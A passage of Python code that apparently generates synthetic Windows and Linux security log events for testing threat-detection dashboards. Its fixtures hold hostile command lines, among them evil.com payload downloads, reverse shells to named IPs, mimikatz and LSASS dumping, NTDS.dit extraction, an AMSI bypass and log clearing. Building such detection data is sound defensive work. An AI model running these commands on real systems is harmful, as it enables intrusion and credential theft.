        image="C:\\Windows\\System32\\sdclt.exe",
        command_line="sdclt.exe /kickoffelev",
        parent_image="C:\\Windows\\System32\\cmd.exe",
        offset=522,
    ))

    # ── Kerberoasting ──
    events.append(sysmon_event(
        event_id=1,
        image="C:\\Temp\\Rubeus.exe",
        command_line="Rubeus.exe kerberoast /outfile:hashes.txt",
        parent_image="C:\\Windows\\System32\\cmd.exe",
        host="DC01.corp.local",
        offset=530,
    ))
    events.append(sysmon_event(
        event_id=1,
        image="C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
        command_line="powershell.exe Invoke-Kerberoast -OutputFormat Hashcat | Out-File hashes.txt",
        parent_image="C:\\Windows\\System32\\cmd.exe",
        host="DC01.corp.local",
        offset=531,
    ))

    # ── BITS Job Persistence ──
    events.append(sysmon_event(
        event_id=1,
        image="C:\\Windows\\System32\\bitsadmin.exe",
        command_line="bitsadmin /SetNotifyCmdLine PersistJob C:\\Temp\\backdoor.exe NULL",
        parent_image="C:\\Windows\\System32\\cmd.exe",
        offset=540,
    ))
    events.append(sysmon_event(
        event_id=1,
        image="C:\\Windows\\System32\\bitsadmin.exe",
        command_line="bitsadmin /AddFile DownloadJob http://evil.com/payload.exe C:\\Temp\\payload.exe",
        parent_image="C:\\Windows\\System32\\cmd.exe",
        offset=541,
    ))

    # ── MSBuild Code Execution ──
    events.append(sysmon_event(
        event_id=1,
        image="C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\MSBuild.exe",
        command_line="MSBuild.exe C:\\Temp\\payload.csproj",
        parent_image="C:\\Windows\\System32\\cmd.exe",
        offset=550,
    ))
    events.append(sysmon_event(
        event_id=1,
        image="C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\MSBuild.exe",
        command_line="MSBuild.exe C:\\Users\\Public\\inline.xml",
        parent_image="C:\\Windows\\explorer.exe",
        offset=551,
    ))

    # ── Pass-the-Hash Indicators ──
    pth_cmds = [
        ("powershell.exe", "powershell.exe Invoke-SMBExec -Target 192.168.1.50 -Hash aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0"),
        ("powershell.exe", "powershell.exe Invoke-WMIExec -Target DC01 -Hash 31d6cfe0d16ae931b73c59d7e0c089c0 -Command whoami"),
        ("C:\\Tools\\crackmapexec.exe", "crackmapexec smb 192.168.1.0/24 -u admin -H 31d6cfe0d16ae931b73c59d7e0c089c0"),
    ]
    for i, (image, cmd) in enumerate(pth_cmds):
        img = "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe" if "powershell" in image else image
        events.append(sysmon_event(
            event_id=1,
            image=img,
            command_line=cmd,
            parent_image="C:\\Windows\\System32\\cmd.exe",
            host="DC01.corp.local",
            offset=560+i,
        ))
    events.append(sysmon_event(
        event_id=1,
        image="C:\\Windows\\System32\\runas.exe",
        command_line="runas.exe /netonly /user:CORP\\admin cmd.exe",
        parent_image="C:\\Windows\\System32\\cmd.exe",
        offset=563,
    ))

    # ── Process Hollowing Indicators ──
    hollow_cmds = [
        "C:\\Temp\\injector.exe NtUnmapViewOfSection WriteProcessMemory NtResumeThread",
        "C:\\Temp\\hollow.exe CREATE_SUSPENDED svchost.exe",
    ]
    for i, cmd in enumerate(hollow_cmds):
        events.append(sysmon_event(
            event_id=1,
            image="C:\\Temp\\injector.exe",
            command_line=cmd,
            parent_image="C:\\Windows\\System32\\cmd.exe",
            offset=570+i,
        ))

    # ── WDigest Credential Harvest ──
    events.append(sysmon_event(
        event_id=1,
        image="C:\\Windows\\System32\\reg.exe",
        command_line='reg add HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f',
        parent_image="C:\\Windows\\System32\\cmd.exe",
        host="DC01.corp.local",
        offset=580,
    ))

    # ── NTDS.dit Extraction ──
    events.append(sysmon_event(
        event_id=1,
        image="C:\\Windows\\System32\\ntdsutil.exe",
        command_line='ntdsutil.exe "ac i ntds" "ifm" "create full C:\\Temp\\ntds_dump" q q',
        parent_image="C:\\Windows\\System32\\cmd.exe",
        host="DC01.corp.local",
        offset=590,
    ))
    events.append(sysmon_event(
        event_id=1,
        image="C:\\Windows\\System32\\cmd.exe",
        command_line="cmd.exe /c copy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\NTDS\\ntds.dit C:\\Temp\\ntds.dit",
        parent_image="C:\\Windows\\System32\\cmd.exe",
        host="DC01.corp.local",
        offset=591,
    ))

    # ═══════════════════════════════════════════════════════════════
    #  NEW (Batch 4): MITRE Tactic Expansion - Windows Events
    # ═══════════════════════════════════════════════════════════════

    # ── Account Discovery (T1087) ──
    acct_disc_cmds = [
        ("C:\\Windows\\System32\\net.exe", "net user /domain"),
        ("C:\\Windows\\System32\\net.exe", "net group /domain"),
        ("C:\\Windows\\System32\\net.exe", "net localgroup administrators"),
        ("C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "powershell.exe Get-ADUser -Filter * -Properties *"),
        ("C:\\Windows\\System32\\dsquery.exe", "dsquery user -name * -limit 500"),
    ]
    for i, (image, cmd) in enumerate(acct_disc_cmds):
        events.append(sysmon_event(
            event_id=1, image=image, command_line=cmd,
            parent_image="C:\\Windows\\System32\\cmd.exe",
            offset=650+i,
        ))

    # ── Network Share Discovery (T1135) ──
    share_disc_cmds = [
        ("C:\\Windows\\System32\\net.exe", "net share"),
        ("C:\\Windows\\System32\\net.exe", "net view \\\\DC01"),
        ("C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "powershell.exe Get-SmbShare"),
        ("C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "powershell.exe Invoke-ShareFinder -ComputerName DC01"),
    ]
    for i, (image, cmd) in enumerate(share_disc_cmds):
        events.append(sysmon_event(
            event_id=1, image=image, command_line=cmd,
            parent_image="C:\\Windows\\System32\\cmd.exe",
            offset=660+i,
        ))

    # ── Remote System Discovery (T1018) ──
    remote_disc_cmds = [
        ("C:\\Windows\\System32\\arp.exe", "arp.exe -a"),
        ("C:\\Windows\\System32\\nslookup.exe", "nslookup DC01.corp.local"),
        ("C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "powershell.exe Test-Connection -ComputerName DC01 -Count 1"),
        ("C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "powershell.exe Get-ADComputer -Filter * -Properties IPv4Address"),
        ("C:\\Windows\\System32\\cmd.exe", 'cmd.exe /c "for /l %i in (1,1,254) do @ping -n 1 192.168.1.%i"'),
    ]
    for i, (image, cmd) in enumerate(remote_disc_cmds):
        events.append(sysmon_event(
            event_id=1, image=image, command_line=cmd,
            parent_image="C:\\Windows\\System32\\cmd.exe",
            offset=670+i,
        ))

    # ── Spearphishing Attachment Execution (T1566.001) ──
    phishing_cmds = [
        ("C:\\Windows\\System32\\cmd.exe", "cmd.exe /c powershell -ep bypass -c IEX(IWR http://evil.com/ps.ps1)", "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE"),
        ("C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "powershell.exe -NoP -Sta -W 1 -Enc JABjAGwA", "C:\\Program Files\\Microsoft Office\\root\\Office16\\EXCEL.EXE"),
        ("C:\\Windows\\System32\\mshta.exe", "mshta.exe http://evil.com/payload.hta", "C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE"),
    ]
    for i, (image, cmd, parent) in enumerate(phishing_cmds):
        events.append(sysmon_event(
            event_id=1, image=image, command_line=cmd,
            parent_image=parent,
            offset=680+i,
        ))

    # ── Data Staging for Exfiltration (T1074.001) ──
    staging_cmds = [
        ("C:\\Windows\\System32\\robocopy.exe", "robocopy.exe C:\\Users\\admin\\Documents C:\\Users\\Public\\staging /MIR"),
        ("C:\\Windows\\System32\\xcopy.exe", "xcopy.exe C:\\Shares\\Finance C:\\Temp\\staging /S /E"),
        ("C:\\Windows\\System32\\compact.exe", "compact /c C:\\Temp\\staging"),
    ]
    for i, (image, cmd) in enumerate(staging_cmds):
        events.append(sysmon_event(
            event_id=1, image=image, command_line=cmd,
            parent_image="C:\\Windows\\System32\\cmd.exe",
            offset=690+i,
        ))

    # ── Keylogger Indicators (T1056.001) ──
    keylogger_cmds = [
        "powershell.exe Add-Type -MemberDefinition '[DllImport(\"user32.dll\")] public static extern short GetAsyncKeyState(int vKey);' -Name kb -Namespace k",
        "C:\\Temp\\keylogger.exe --output C:\\Temp\\keystrokes.txt",
    ]
    for i, cmd in enumerate(keylogger_cmds):
        events.append(sysmon_event(
            event_id=1,
            image="C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe" if "powershell" in cmd.lower() else "C:\\Temp\\keylogger.exe",
            command_line=cmd,
            parent_image="C:\\Windows\\System32\\cmd.exe",
            offset=700+i,
        ))

    # ── Screen Capture (T1113) ──
    screenshot_cmds = [
        "powershell.exe -c [System.Drawing.Graphics]::CopyFromScreen(0,0,0,0,[System.Drawing.Size]::new(1920,1080))",
        "nircmd.exe savescreenshot C:\\Temp\\screenshot.png",
    ]
    for i, cmd in enumerate(screenshot_cmds):
        events.append(sysmon_event(
            event_id=1,
            image="C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe" if "powershell" in cmd.lower() else "C:\\Tools\\nircmd.exe",
            command_line=cmd,
            parent_image="C:\\Windows\\System32\\cmd.exe",
            offset=710+i,
        ))

    # ── Remote Access Tools (T1219) ──
    rat_cmds = [
        ("C:\\Program Files\\AnyDesk\\AnyDesk.exe", "AnyDesk.exe --start-service"),
        ("C:\\Users\\analyst\\Downloads\\ngrok.exe", "ngrok.exe tcp 3389"),
        ("C:\\Program Files\\TeamViewer\\TeamViewer.exe", "TeamViewer.exe"),
    ]
    for i, (image, cmd) in enumerate(rat_cmds):
        events.append(sysmon_event(
            event_id=1, image=image, command_line=cmd,
            parent_image="C:\\Windows\\explorer.exe",
            offset=720+i,
        ))

    # ── Access Token Manipulation (T1134) ──
    token_cmds = [
        "powershell.exe Invoke-TokenManipulation -Enumerate",
        "C:\\Temp\\JuicyPotato.exe -l 1337 -p C:\\Windows\\System32\\cmd.exe -a '/c C:\\Temp\\payload.exe' -t *",
        "C:\\Temp\\PrintSpoofer.exe -i -c cmd.exe",
        "powershell.exe token::elevate",
    ]
    for i, cmd in enumerate(token_cmds):
        events.append(sysmon_event(
            event_id=1,
            image="C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe" if "powershell" in cmd.lower() else cmd.split()[0],
            command_line=cmd,
            parent_image="C:\\Windows\\System32\\cmd.exe",
            offset=730+i,
        ))

    # ═══════════════════════════════════════════════════════════════
    #  HUNTING: High-volume events for aggregation-based queries
    # ═══════════════════════════════════════════════════════════════

    # ── Long Command Line: Extra-long encoded payloads (>500 chars) ──
    long_payload = "A" * 600  # Simulates base64-encoded payload
    events.append(sysmon_event(
        event_id=1,
        image="C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
        command_line=f"powershell.exe -NoProfile -NonInteractive -EncodedCommand {long_payload}",
        parent_image="C:\\Windows\\System32\\cmd.exe",
        offset=600,
    ))
    events.append(sysmon_event(
        event_id=1,
        image="C:\\Windows\\System32\\cmd.exe",
        command_line=f"cmd.exe /c echo {long_payload} | certutil -decode - C:\\Temp\\payload.exe",
        parent_image="C:\\Windows\\explorer.exe",
        offset=601,
    ))

    # ── Lateral Movement Cluster: Multiple tools on same host ──
    pivot_host = "SRV01.corp.local"
    events.append(sysmon_event(
        event_id=1,
        image="C:\\Tools\\PsExec.exe",
        command_line="psexec.exe \\\\DC01 -accepteula -s cmd.exe",
        parent_image="C:\\Windows\\System32\\cmd.exe",
        host=pivot_host,
        offset=610,
    ))
    events.append(sysmon_event(
        event_id=1,
        image="C:\\Windows\\System32\\mstsc.exe",
        command_line="mstsc.exe /v:DC01.corp.local /admin",
        parent_image="C:\\Windows\\explorer.exe",
        host=pivot_host,
        offset=611,
    ))
    events.append(sysmon_event(
        event_id=1,
        image="C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
        command_line="powershell.exe Enter-PSSession -ComputerName DC01",
        parent_image="C:\\Windows\\System32\\cmd.exe",
        host=pivot_host,
        offset=612,
    ))
    events.append(sysmon_event(
        event_id=1,
        image="C:\\Windows\\System32\\net.exe",
        command_line="net use \\\\DC01\\c$ /user:CORP\\admin P@ssw0rd",
        parent_image="C:\\Windows\\System32\\cmd.exe",
        host=pivot_host,
        offset=613,
    ))

    # ── Credential Access Cluster: Multiple techniques on same host ──
    cred_host = "DC01.corp.local"
    events.append(sysmon_event(
        event_id=1,
        image="C:\\Temp\\mimikatz.exe",
        command_line="mimikatz.exe privilege::debug sekurlsa::logonpasswords exit",
        parent_image="C:\\Windows\\System32\\cmd.exe",
        host=cred_host, user="CORP\\admin",
        offset=620,
    ))
    events.append(sysmon_event(
        event_id=1,
        image="C:\\Windows\\System32\\rundll32.exe",
        command_line="rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump 672 C:\\Temp\\lsass.dmp full",
        parent_image="C:\\Windows\\System32\\cmd.exe",
        host=cred_host, user="CORP\\admin",
        offset=621,
    ))
    events.append(sysmon_event(
        event_id=1,
        image="C:\\Temp\\Rubeus.exe",
        command_line="Rubeus.exe kerberoast /outfile:hashes.txt",
        parent_image="C:\\Windows\\System32\\cmd.exe",
        host=cred_host, user="CORP\\admin",
        offset=622,
    ))
    events.append(sysmon_event(
        event_id=1,
        image="C:\\Windows\\System32\\ntdsutil.exe",
        command_line='ntdsutil.exe "ac i ntds" "ifm" "create full C:\\Temp\\ntds" q q',
        parent_image="C:\\Windows\\System32\\cmd.exe",
        host=cred_host, user="CORP\\admin",
        offset=623,
    ))

    # ── Defense Evasion Score: Multiple evasion techniques on same host ──
    evasion_host = "WS01.corp.local"
    events.append(sysmon_event(
        event_id=1,
        image="C:\\Windows\\System32\\wevtutil.exe",
        command_line="wevtutil.exe cl Security",
        parent_image="C:\\Windows\\System32\\cmd.exe",
        host=evasion_host,
        offset=630,
    ))
    events.append(sysmon_event(
        event_id=1,
        image="C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
        command_line="powershell.exe -c [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)",
        parent_image="C:\\Windows\\System32\\cmd.exe",
        host=evasion_host,
        offset=631,
    ))
    events.append(sysmon_event(
        event_id=1,
        image="C:\\Windows\\System32\\netsh.exe",
        command_line="netsh advfirewall set allprofiles state off",
        parent_image="C:\\Windows\\System32\\cmd.exe",
        host=evasion_host,
        offset=632,
    ))
    events.append(sysmon_event(
        event_id=1,
        image="C:\\Windows\\System32\\fodhelper.exe",
        command_line="fodhelper.exe",
        parent_image="C:\\Temp\\malware.exe",
        host=evasion_host,
        offset=633,
    ))

    # ── Unusual Process Paths: Processes from non-standard locations ──
    unusual_procs = [
        ("C:\\Users\\Public\\evil.exe", "C:\\Users\\Public\\evil.exe --connect 10.0.0.1"),
        ("C:\\Users\\analyst\\Downloads\\tool.exe", "tool.exe -scan -all"),
        ("C:\\Users\\analyst\\AppData\\Local\\Temp\\update.exe", "update.exe --install"),
    ]
    for i, (image, cmd) in enumerate(unusual_procs):
        events.append(sysmon_event(
            event_id=1,
            image=image,
            command_line=cmd,
            parent_image="C:\\Windows\\explorer.exe",
            offset=640+i,
        ))

    return events


# ═══════════════════════════════════════════════════════════════════
#  Multicloudoperations-compatible Log Sources
# ═══════════════════════════════════════════════════════════════════

# Threat actor names used by multicloudoperations Campaign Tracker
THREAT_ACTORS = ["joffrey", "littlefinger", "arya", "daenerys", "sql_svc", "svc-devops"]
THREAT_ACTOR_EMAILS = [
    "joffrey.baratheon@sevenkingdoms.local",
    "arya.stark@sevenkingdoms.local",
]
SEVEN_KINGDOMS_HOSTS = [
    "DC01.sevenkingdoms.local", "SRV01.sevenkingdoms.local",
    "WS01.sevenkingdoms.local", "WS02.sevenkingdoms.local",
    "DB01.sevenkingdoms.local",
]
SEVEN_KINGDOMS_LINUX = [
    "web01.sevenkingdoms.local", "app01.sevenkingdoms.local",
    "db01.sevenkingdoms.local", "bastion.sevenkingdoms.local",
    "k8s-node01.sevenkingdoms.local",
]


def winsec_event(event_id, user=None, host=None, source_addr=None,
                 logon_type=None, process_name=None, msg=None, offset=0):
    """Generate a Windows Security Event Log JSON entry."""
    if user is None:
        user = random.choice(THREAT_ACTORS)
    if host is None:
        host = random.choice(SEVEN_KINGDOMS_HOSTS)
    if source_addr is None:
        source_addr = random.choice(SUSPICIOUS_IPS + CORPORATE_IPS)
    return {
        "EventID": str(event_id),
        "TimeCreated": ts(offset),
        "Computer": host,
        "Channel": "Security",
        "Provider": "Microsoft-Windows-Security-Auditing",
        "User": user,
        "SourceAddress": source_addr,
        "LogonType": str(logon_type) if logon_type else "",
        "ProcessName": process_name or "",
        "msg": msg or f"Windows Security Event {event_id}",
    }


def generate_windows_event_security():
    """Generate Windows Security Event Log events for multicloudoperations widgets."""
    events = []

    # ── Event 4625: Failed Logon (brute force) ──
    for i in range(25):
        actor = random.choice(THREAT_ACTORS + THREAT_ACTOR_EMAILS)
        events.append(winsec_event(
            4625, user=actor,
            source_addr=random.choice(SUSPICIOUS_IPS),
            logon_type=random.choice([3, 10]),
            msg="An account failed to log on.",
            offset=i,
        ))

    # ── Event 4624: Successful Logon ──
    for i in range(15):
        actor = random.choice(THREAT_ACTORS)
        lt = random.choice([2, 3, 10])
        events.append(winsec_event(
            4624, user=actor,
            source_addr=random.choice(CORPORATE_IPS + SUSPICIOUS_IPS),
            logon_type=lt,
            msg="An account was successfully logged on.",
            offset=100+i,
        ))

    # ── Event 4624 LogonType=10 (RDP) ──
    for i in range(8):
        events.append(winsec_event(
            4624, user=random.choice(THREAT_ACTORS),
            source_addr=random.choice(SUSPICIOUS_IPS),
            logon_type=10,
            msg="An account was successfully logged on.",
            offset=120+i,
        ))

    # ── Event 4672: Special Privileges Assigned ──
    for i in range(10):
        events.append(winsec_event(
            4672, user=random.choice(THREAT_ACTORS),
            msg="Special privileges assigned to new logon.",
            offset=200+i,
        ))

    # ── Event 4720: User Account Created ──
    for i in range(5):
        events.append(winsec_event(
            4720, user=random.choice(THREAT_ACTORS),
            msg="A user account was created.",
            offset=300+i,
        ))

    # ── Event 4698: Scheduled Task Created ──
    for i in range(4):
        events.append(winsec_event(
            4698, user=random.choice(THREAT_ACTORS),
            msg="A scheduled task was created.",
            offset=310+i,
        ))

    # ── Event 4728/4732/4756: Group Membership Changes ──
    group_events = [
        (4728, "A member was added to a security-enabled global group."),
        (4732, "A member was added to a security-enabled local group."),
        (4756, "A member was added to a security-enabled universal group."),
    ]
    for idx, (eid, msg_text) in enumerate(group_events):
        for i in range(3):
            events.append(winsec_event(
                eid, user=random.choice(THREAT_ACTORS),
                msg=msg_text, offset=320+idx*5+i,
            ))

    # ── Event 1102: Audit Log Cleared ──
    for i in range(4):
        events.append(winsec_event(
            1102, user=random.choice(THREAT_ACTORS),
            msg="The audit log was cleared.",
            offset=400+i,
        ))

    # ── Event 4688: Process Creation ──
    procs = [
        "C:\\Windows\\System32\\cmd.exe",
        "C:\\Windows\\System32\\powershell.exe",
        "C:\\Windows\\System32\\net.exe",
        "C:\\Windows\\System32\\whoami.exe",
    ]
    for i, proc in enumerate(procs):
        events.append(winsec_event(
            4688, user=random.choice(THREAT_ACTORS),
            process_name=proc,
            msg=f"A new process has been created: {proc}",
            offset=500+i,
        ))

    # ── Event 4946/4947: Firewall Rule Changes ──
    for i in range(3):
        events.append(winsec_event(
            4946, user=random.choice(THREAT_ACTORS),
            msg="A change has been made to Windows Firewall exception list. A rule was added.",
            offset=600+i,
        ))
    for i in range(2):
        events.append(winsec_event(
            4947, user=random.choice(THREAT_ACTORS),
            msg="A change has been made to Windows Firewall exception list. A rule was modified.",
            offset=610+i,
        ))

    # ── Event 4656/4663: Object Access ──
    for i in range(4):
        events.append(winsec_event(
            4656, user=random.choice(THREAT_ACTORS),
            msg="A handle to an object was requested.",
            offset=700+i,
        ))
    for i in range(4):
        events.append(winsec_event(
            4663, user=random.choice(THREAT_ACTORS),
            msg="An attempt was made to access an object.",
            offset=710+i,
        ))

    return events


def winsys_event(event_id, host=None, service_name=None, user=None,
                 msg=None, offset=0):
    """Generate a Windows System Event Log JSON entry."""
    if host is None:
        host = random.choice(SEVEN_KINGDOMS_HOSTS)
    if user is None:
        user = random.choice(["SYSTEM", "LOCAL SERVICE"] + THREAT_ACTORS)
    return {
        "EventID": str(event_id),
        "TimeCreated": ts(offset),
        "Computer": host,
        "Channel": "System",
        "Provider": "Service Control Manager",
        "ServiceName": service_name or "",
        "User": user,
        "msg": msg or f"Windows System Event {event_id}",
    }


def generate_windows_event_system():
    """Generate Windows System Event Log events for multicloudoperations widgets."""
    events = []

    # ── Event 7045: New Service Installed ──
    malicious_services = [
        ("backdoor_svc", "C:\\Temp\\backdoor.exe"),
        ("evil_agent", "C:\\Windows\\Temp\\agent.exe"),
        ("update_service", "C:\\Users\\Public\\updater.exe"),
        ("cobaltstrike", "C:\\ProgramData\\beacon.exe"),
        ("persistence_svc", "powershell.exe -ep bypass -f C:\\Temp\\payload.ps1"),
    ]
    for i, (svc_name, svc_path) in enumerate(malicious_services):
        for j in range(3):
            events.append(winsys_event(
                7045,
                service_name=svc_name,
                user=random.choice(THREAT_ACTORS + ["SYSTEM"]),
                msg=f"A service was installed in the system. Service Name: {svc_name} Service File Name: {svc_path}",
                offset=i*5+j,
            ))

    # ── Event 7036: Service State Changes ──
    for i in range(5):
        events.append(winsys_event(
            7036,
            service_name=random.choice([s[0] for s in malicious_services]),
            msg="The service entered the running state.",
            offset=100+i,
        ))

    return events


def linux_secure_event(process, message, host=None, user=None,
                       source_ip=None, auth_method=None, facility="auth",
                       severity="info", offset=0):
    """Generate a Linux Secure/Auth log JSON entry for the Linux Secure Logs source."""
    if host is None:
        host = random.choice(SEVEN_KINGDOMS_LINUX)
    if user is None:
        user = random.choice(THREAT_ACTORS)
    return {
        "EndpointOS": "Linux",
        "Timestamp": ts(offset),
        "Hostname": host,
        "Process": process,
        "PID": random.randint(100, 65535),
        "Facility": facility,
        "Severity": severity,
        "msg": message,
        "SourceIP": source_ip or random.choice(SUSPICIOUS_IPS),
        "User": user,
        "AuthMethod": auth_method or "password",
        "SessionType": "ssh" if process == "sshd" else "local",
    }


def generate_linux_secure():
    """Generate Linux Secure log events for multicloudoperations widgets."""
    events = []

    # ── SSH Failed Password ──
    for i in range(20):
        actor = random.choice(THREAT_ACTORS + THREAT_ACTOR_EMAILS)
        src_ip = random.choice(SUSPICIOUS_IPS)
        events.append(linux_secure_event(
            "sshd",
            f"Failed password for {actor} from {src_ip} port {random.randint(40000,65535)} ssh2",
            user=actor, source_ip=src_ip,
            offset=i,
        ))

    # ── SSH Invalid User ──
    for i in range(10):
        src_ip = random.choice(SUSPICIOUS_IPS)
        events.append(linux_secure_event(
            "sshd",
            f"Invalid user {random.choice(THREAT_ACTORS)} from {src_ip} port {random.randint(40000,65535)}",
            source_ip=src_ip,
            offset=30+i,
        ))

    # ── SSH authentication failure ──
    for i in range(8):
        src_ip = random.choice(SUSPICIOUS_IPS)
        events.append(linux_secure_event(
            "sshd",
            f"pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost={src_ip}",
            source_ip=src_ip,
            offset=50+i,
        ))

    # ── Sudo failures ──
    for i in range(8):
        actor = random.choice(THREAT_ACTORS)
        events.append(linux_secure_event(
            "sudo",
            f"{actor} : 3 incorrect password attempts ; TTY=pts/0 ; PWD=/home/{actor} ; USER=root ; COMMAND=/bin/bash",
            user=actor,
            offset=100+i,
        ))

    # ── Sudo NOT in sudoers ──
    for i in range(5):
        actor = random.choice(THREAT_ACTORS)
        events.append(linux_secure_event(
            "sudo",
            f"{actor} : user NOT in sudoers ; TTY=pts/0 ; PWD=/home/{actor} ; USER=root ; COMMAND=/bin/su",
            user=actor,
            offset=120+i,
        ))

    # ── Sudo success ──
    for i in range(10):
        actor = random.choice(THREAT_ACTORS)
        events.append(linux_secure_event(
            "sudo",
            f"{actor} : TTY=pts/{i} ; PWD=/tmp ; USER=root ; COMMAND=/bin/bash",
            user=actor,
            offset=130+i,
        ))

    # ── useradd / adduser: New account creation ──
    for i in range(5):
        events.append(linux_secure_event(
            "useradd",
            f"new user: name=backdoor{i}, UID=100{i}, GID=100{i}, home=/home/backdoor{i}, shell=/bin/bash",
            user=random.choice(THREAT_ACTORS),
            offset=200+i,
        ))
    for i in range(3):
        events.append(linux_secure_event(
            "adduser",
            f"new user: name=evil{i}, UID=200{i}, GID=200{i}, home=/home/evil{i}, shell=/bin/bash",
            user=random.choice(THREAT_ACTORS),
            offset=210+i,
        ))

    # ── passwd: Password changes ──
    for i in range(4):
        actor = random.choice(THREAT_ACTORS)
        events.append(linux_secure_event(
            "passwd",
            f"pam_unix(passwd:chauthtok): password changed for {actor}",
            user=actor,
            offset=220+i,
        ))

    # ── Crontab modification (T1053.003) ──
    for i in range(6):
        actor = random.choice(THREAT_ACTORS)
        events.append(linux_secure_event(
            "crontab",
            f"({actor}) REPLACE ({actor}) crontab",
            user=actor, facility="cron",
            offset=300+i,
        ))
    for i in range(3):
        events.append(linux_secure_event(
            "crond",
            f"(root) REPLACE (root) crontab",
            user="root", facility="cron",
            offset=310+i,
        ))

    # ── systemctl enable (T1543.002) ──
    for i in range(4):
        events.append(linux_secure_event(
            "systemctl",
            f"enable evil-service-{i}.service",
            user=random.choice(THREAT_ACTORS),
            offset=320+i,
        ))

    # ── authorized_keys modification (T1098.004) ──
    for i in range(5):
        actor = random.choice(THREAT_ACTORS)
        events.append(linux_secure_event(
            "sshd",
            f"Accepted publickey for {actor} from {random.choice(SUSPICIOUS_IPS)} port 22 ssh2: RSA SHA256:AAAA",
            user=actor, auth_method="publickey",
            offset=400+i,
        ))
    for i in range(4):
        events.append(linux_secure_event(
            "bash",
            f"echo 'ssh-rsa AAAA... attacker@evil' >> /home/{random.choice(THREAT_ACTORS)}/.ssh/authorized_keys",
            facility="syslog",
            offset=410+i,
        ))

    # ── History clearing (T1070.003) ──
    history_cmds = [
        "history -c", "rm -f ~/.bash_history",
        "unset HISTFILE", "export HISTSIZE=0",
        "cat /dev/null > ~/.bash_history",
    ]
    for i, cmd in enumerate(history_cmds):
        events.append(linux_secure_event(
            "bash", cmd,
            user=random.choice(THREAT_ACTORS),
            facility="syslog",
            offset=500+i,
        ))

    # ── Defense evasion: chmod +s, /etc/shadow, /etc/passwd ──
    evasion_cmds = [
        "chmod +s /tmp/exploit",
        "chmod u+s /usr/local/bin/backdoor",
        "chmod 777 /etc/shadow",
        "chmod 666 /etc/passwd",
    ]
    for i, cmd in enumerate(evasion_cmds):
        events.append(linux_secure_event(
            "bash", cmd,
            user=random.choice(THREAT_ACTORS),
            facility="syslog",
            offset=510+i,
        ))

    # ── Execution: curl/wget/nc/python/perl/bash ──
    exec_cmds = [
        ("curl", "curl -o /tmp/payload http://evil.com/malware"),
        ("wget", "wget http://evil.com/backdoor -O /tmp/bd"),
        ("python", "python -c 'import pty;pty.spawn(\"/bin/sh\")'"),
        ("perl", "perl -e 'exec \"/bin/sh\"'"),
    ]
    for i, (proc, cmd) in enumerate(exec_cmds):
        events.append(linux_secure_event(
            proc, cmd,
            user=random.choice(THREAT_ACTORS),
            facility="syslog",
            offset=600+i,
        ))

    # ── Reverse shell patterns ──
    shells = [
        "bash -i >& /dev/tcp/185.215.113.206/4444 0>&1",
        "nc -e /bin/sh 103.253.41.45 8080",
        "python3 -c 'import socket,subprocess;s=socket.socket();s.connect((\"185.215.113.206\",4444));'",
        "mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 5.252.178.48 443 >/tmp/f",
    ]
    for i, shell in enumerate(shells):
        events.append(linux_secure_event(
            "bash", shell,
            user=random.choice(THREAT_ACTORS),
            facility="syslog",
            offset=700+i,
        ))

    # ── Network defense evasion: iptables/ufw ──
    net_cmds = [
        ("iptables", "iptables -F"),
        ("iptables", "iptables -A INPUT -p tcp --dport 4444 -j ACCEPT"),
        ("ufw", "ufw disable"),
    ]
    for i, (proc, cmd) in enumerate(net_cmds):
        events.append(linux_secure_event(
            proc, cmd,
            user=random.choice(THREAT_ACTORS),
            facility="syslog",
            offset=800+i,
        ))

    # ── Credential access: /proc/kcore, /dev/mem ──
    cred_cmds = [
        "cat /proc/kcore > /tmp/memory.dmp",
        "dd if=/dev/mem of=/tmp/mem.dmp bs=1M count=10",
    ]
    for i, cmd in enumerate(cred_cmds):
        events.append(linux_secure_event(
            "bash", cmd,
            user=random.choice(THREAT_ACTORS),
            facility="syslog",
            offset=900+i,
        ))

    return events


def sysmon_op_event(event_id, host=None, user=None, source_image=None,
                    target_image=None, command_line=None,
                    dest_hostname=None, dest_ip=None, dest_port=None,
                    query_name=None, query_results=None,
                    pipe_name=None, target_filename=None,
                    granted_access=None, msg=None, offset=0):
    """Generate a Windows Sysmon Operational Log JSON entry."""
    if host is None:
        host = random.choice(SEVEN_KINGDOMS_HOSTS)
    if user is None:
        user = random.choice(THREAT_ACTORS)
    return {
        "EndpointOS": "Windows",
        "EventID": str(event_id),
        "TimeCreated": ts(offset),
        "Computer": host,
        "Channel": "Microsoft-Windows-Sysmon/Operational",
        "Provider": "Microsoft-Windows-Sysmon",
        "User": user,
        "SourceImage": source_image or "",
        "TargetImage": target_image or "",
        "CommandLine": command_line or "",
        "DestinationHostname": dest_hostname or "",
        "DestinationIp": dest_ip or "",
